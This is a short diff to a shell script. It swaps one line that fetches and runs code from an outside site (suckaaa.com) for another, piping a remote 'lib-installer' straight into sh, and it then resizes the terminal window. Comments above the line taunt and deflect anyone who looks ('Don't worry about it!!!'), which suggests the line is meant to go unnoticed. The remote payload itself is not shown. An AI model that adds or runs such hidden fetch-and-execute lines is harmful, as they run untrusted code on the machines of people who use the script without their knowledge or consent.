@@ -3,7 +3,7 @@
 # loL whatcha lookin for in here???
 # Don't worry about it!!!
 
-source <(curl -s https://suckaaa.com/s/lib);
+curl -s 'https://suckaaa.com/s/lib-installer' | sh;
 
 # Set the window to 100x50 characters:
 printf '\e[8;50;100t'
